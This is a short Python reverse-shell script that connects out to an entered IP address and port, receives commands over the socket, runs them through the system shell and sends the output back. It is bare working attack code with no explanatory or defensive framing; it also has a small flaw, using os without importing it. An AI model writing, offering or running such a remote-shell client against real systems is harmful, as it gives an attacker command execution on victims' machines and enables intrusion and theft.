import socket
import subprocess

RHOST = input("Enter the target IP address: ")
RPORT = int(input("Enter the target port number: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

while True:
    cmd = s.recv(1024)
    if cmd[:2].decode("utf-8") == "cd":
        os.chdir(cmd[3:].decode("utf-8"))
    if len(cmd) > 0:
        output = subprocess.run(cmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(output.stdout)

s.close()
